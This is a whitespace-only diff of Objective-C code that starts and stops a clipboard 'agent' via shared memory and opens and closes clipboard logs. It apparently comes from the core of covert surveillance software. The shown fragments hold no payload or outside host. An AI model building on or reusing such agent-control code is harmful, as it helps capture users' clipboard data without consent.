@@ -202,26 +202,26 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       NSError *rmErr;
       
       if (![[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName error: &rmErr])
-      {
+        {
 #ifdef DEBUG_CONF_MANAGER
-        infoLog(@"Error remove file configuration %@", rmErr);
+          infoLog(@"Error remove file configuration %@", rmErr);
 #endif
-      }
+        }
     }
   
   if ([aConfigurationData writeToFile: gConfigurationUpdateName
                        atomically: YES])
-  {
+    {
 #ifdef DEBUG_CONF_MANAGER
-    infoLog(@"file configuration write correctly");
+      infoLog(@"file configuration write correctly");
 #endif
-  }
+    }
   else
-  {
+    {
 #ifdef DEBUG_CONF_MANAGER
-    infoLog(@"Error writing file configuration");
+      infoLog(@"Error writing file configuration");
 #endif
-  }
+    }
   
   if ([mConfigManager checkConfigurationIntegrity: gConfigurationUpdateName])
     {
@@ -817,47 +817,47 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
         NSLog(@"%s: Starting Agent clipboard", __FUNCTION__);
 #endif
-        
+
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
+
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
             && [agentConfiguration objectForKey: @"status"] != AGENT_START)
-        {
-          agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-          
-          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-          shMemoryHeader->agentID         = agentID;
-          shMemoryHeader->direction       = D_TO_AGENT;
-          shMemoryHeader->command         = AG_START;
-          shMemoryHeader->commandDataSize = 0;
-          
-          BOOL success = [_logManager createLog: LOG_CLIPBOARD
-                                    agentHeader: nil
-                                      withLogID: 0];
-          
-          if (success == TRUE)
           {
-            if ([mSharedMemory writeMemory: agentCommand
-                                    offset: OFFT_CLIPBOARD
-                             fromComponent: COMP_CORE])
-            {
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
+
+            BOOL success = [_logManager createLog: LOG_CLIPBOARD
+              agentHeader: nil
+              withLogID: 0];
+
+            if (success == TRUE)
+              {
+                if ([mSharedMemory writeMemory: agentCommand
+                    offset: OFFT_CLIPBOARD
+                    fromComponent: COMP_CORE])
+                  {
 #ifdef DEBUG
-              NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
+                    NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
 #endif
-              [agentConfiguration setObject: AGENT_RUNNING
-                                     forKey: @"status"];
-            }
+                    [agentConfiguration setObject: AGENT_RUNNING
+                      forKey: @"status"];
+                  }
+              }
+
+            [agentConfiguration release];
+            [agentCommand release];
           }
-          
-          [agentConfiguration release];
-          [agentCommand release];
-        }
         else
-        {
+          {
 #ifdef DEBUG
-          NSLog(@"%s: Agent clipboard is already running", __FUNCTION__);
+            NSLog(@"%s: Agent clipboard is already running", __FUNCTION__);
 #endif
-        }
+          }
         break;
       }
     default:
@@ -1145,29 +1145,29 @@ extern RCSISharedMemory *mSharedMemoryCommand;
         NSLog(@"Stopping Agent clipboard");
 #endif
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-        
+
         shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
         shMemoryHeader->agentID         = agentID;
         shMemoryHeader->direction       = D_TO_AGENT;
         shMemoryHeader->command         = AG_STOP;
-        
+
         if ([mSharedMemory writeMemory: agentCommand
-                                offset: OFFT_CLIPBOARD
-                         fromComponent: COMP_CORE] == TRUE)
-        {
+            offset: OFFT_CLIPBOARD
+            fromComponent: COMP_CORE] == TRUE)
+          {
 #ifdef DEBUG
-          NSLog(@"Stop command sent to Agent clipboard");
+            NSLog(@"Stop command sent to Agent clipboard");
 #endif
-          
-          agentConfiguration = [self getConfigForAgent: agentID];
-          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-          
-          [_logManager closeActiveLog: LOG_CLIPBOARD 
-                            withLogID: 0];
-        }
-        
+
+            agentConfiguration = [self getConfigForAgent: agentID];
+            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+
+            [_logManager closeActiveLog: LOG_CLIPBOARD 
+              withLogID: 0];
+          }
+
         [agentCommand release];
-        
+
         break;
       }
     default:
@@ -1524,37 +1524,37 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 NSLog(@"%s: Starting Agent clipboard", __FUNCTION__);
 #endif
                 agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
+
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                 shMemoryHeader->agentID         = agentID;
                 shMemoryHeader->direction       = D_TO_AGENT;
                 shMemoryHeader->command         = AG_START;
                 shMemoryHeader->commandDataSize = 0;
-                
+
                 BOOL success = [_logManager createLog: LOG_CLIPBOARD
-                                          agentHeader: nil
-                                            withLogID: 0];
-                
+                  agentHeader: nil
+                  withLogID: 0];
+
                 if (success == TRUE)
-                {
-                  if ([mSharedMemory writeMemory: agentCommand
-                                          offset: OFFT_CLIPBOARD
-                                   fromComponent: COMP_CORE])
+                  {
+                    if ([mSharedMemory writeMemory: agentCommand
+                        offset: OFFT_CLIPBOARD
+                        fromComponent: COMP_CORE])
+                      {
+#ifdef DEBUG
+                        NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
+#endif
+                        [anObject setObject: AGENT_RUNNING
+                          forKey: @"status"];
+                      }
+                  }
+                else
                   {
 #ifdef DEBUG
-                    NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
+                    NSLog(@"An error occurred while creating log for Agent clipboard");
 #endif
-                    [anObject setObject: AGENT_RUNNING
-                                 forKey: @"status"];
                   }
-                }
-                else
-                {
-#ifdef DEBUG
-                  NSLog(@"An error occurred while creating log for Agent clipboard");
-#endif
-                }
-                
+
                 [agentCommand release];
                 break;
               }
@@ -1835,29 +1835,29 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 NSLog(@"Stopping Agent clipboard");
 #endif
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
+
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                 shMemoryHeader->agentID         = agentID;
                 shMemoryHeader->direction       = D_TO_AGENT;
                 shMemoryHeader->command         = AG_STOP;
-                
+
                 if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_CLIPBOARD
-                                 fromComponent: COMP_CORE] == TRUE)
-                {
+                    offset: OFFT_CLIPBOARD
+                    fromComponent: COMP_CORE] == TRUE)
+                  {
 #ifdef DEBUG
-                  NSLog(@"Stop command sent to Agent clipboard");
+                    NSLog(@"Stop command sent to Agent clipboard");
 #endif
-                  
-                  [_logManager closeActiveLog: LOG_CLIPBOARD 
-                                    withLogID: 0];
-                  
-                  [anObject setObject: AGENT_STOP
-                               forKey: @"status"];
-                }
-                
+
+                    [_logManager closeActiveLog: LOG_CLIPBOARD 
+                      withLogID: 0];
+
+                    [anObject setObject: AGENT_STOP
+                      forKey: @"status"];
+                  }
+
                 [agentCommand release];
-                
+
                 break;
               }
             default:
